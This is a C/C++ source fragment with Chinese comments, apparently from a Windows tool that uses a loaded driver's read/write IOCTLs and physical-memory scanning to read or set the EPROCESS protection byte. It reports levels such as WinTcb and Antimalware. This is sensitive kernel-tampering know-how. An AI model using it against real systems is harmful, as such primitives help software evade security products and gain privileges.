        // 不 — 标准 PS_PROTECTION 是 Type:3 Audit:3 Signer:2 共8位
        // Signer 0-3: None, Authenticode, CodeGen, Antimalware (旧)
        // WinTcb=6 不可能放进2位... 除非布局不同
        // 从 RtlTestProtectedAccess 的 shr 4 看, 高4位用作索引
        // 实际: Type:3 + Audit:1 + Signer:4 ? 这才符合 shr 4
        // 暂时用高4位做 signer 查表 (用 types 数组索引)
        (void)signer; // 抑制未使用警告
        char lvl[64];
        snprintf(lvl, sizeof(lvl), "Type=%d SignerNibble=0x%X",
                 type, (pv >> 4) & 0xF);
        // 简单描述
        if (pv == 0xC1) level = "WinTcb-ProtectedLight";
        else if (pv == 0xA1) level = "Windows-ProtectedLight";
        else if (pv == 0x61) level = "Antimalware-ProtectedLight";
        else if (pv == 0x81) level = "Lsa-ProtectedLight";
        else if (pv == 0xC2) level = "WinTcb-Protected";
        else level = lvl;
    }
    snprintf(g_pp.status, sizeof(g_pp.status),
        "{"
        "\"driver_loaded\":%s,"
        "\"driver_type\":%d,"
        "\"kerncore_ram_ranges\":%d,"
        "\"ntoskrnl_base\":\"0x%llx\","
        "\"protection_offset\":\"0x%X\","
        "\"unique_pid_offset\":\"0x%X\","
        "\"active_links_offset\":\"0x%X\","
        "\"ps_initial_system_process\":\"0x%llx\","
        "\"our_eprocess\":\"0x%llx\","
        "\"protection_byte\":\"0x%02X\","
        "\"level\":\"%s\","
        "\"ppl_active\":%s"
        "}",
        g_pp.driver_loaded ? "true" : "false",
        g_pp.driver_type,
        g_kc_ram_count,
        g_pp.ntoskrnl_base,
        g_pp.protection_offset,
        g_pp.unique_pid_offset,
        g_pp.active_links_offset,
        g_pp.ps_initial_system_process,
        g_pp.our_eprocess,
        pv,
        level,
        (cur >= 0 && pv != 0) ? "true" : "false");
    return g_pp.status;
}

bool process_protect_set_generic_ioctl(const char* deviceName,
                                       unsigned int readIoctl,
                                       unsigned int writeIoctl) {
    if (!deviceName) return false;
    strncpy(g_pp.gen_device, deviceName, sizeof(g_pp.gen_device) - 1);
    g_pp.gen_device[sizeof(g_pp.gen_device) - 1] = 0;
    g_pp.gen_read_ioctl = readIoctl;
    g_pp.gen_write_ioctl = writeIoctl;
    return true;
}

// 设置 KernCoreLib64 物理扫描使用的 hole-free RAM 物理范围
//   CSV: "base,len;base,len;..."  base/len 可十进制或 0x 十六进制 (字节)
//   仅扫描这些范围 → 绝不触碰 MMIO → 不会卡死; 空则 kerncore 拒绝盲扫
bool process_protect_set_ram_ranges(const char* rangesCsv) {
    g_kc_ram_count = 0;
    if (!rangesCsv || !*rangesCsv) return false;
    const char* p = rangesCsv;
    while (*p && g_kc_ram_count < KC_MAX_RAM_RANGES) {
        char* end = nullptr;
        unsigned long long b = strtoull(p, &end, 0);   // base 0 = 自动 0x/十进制
        if (end == p || *end != ',') break;
        p = end + 1;
        unsigned long long len = strtoull(p, &end, 0);
        if (end == p) break;
        if (b != 0 && len != 0) {
            g_kc_ram[g_kc_ram_count].base = b;
            g_kc_ram[g_kc_ram_count].len  = len;
            g_kc_ram_count++;
        }
        p = end;
        if (*p == ';') p++;
        else if (*p) break;
    }
    log_msg("kerncore: 解析 RAM 物理范围 %d 段", g_kc_ram_count);
    return g_kc_ram_count > 0;
}

void process_protect_unload_driver(void) {
    driver_unload_internal();
    log_msg("driver unloaded + service deleted");
}
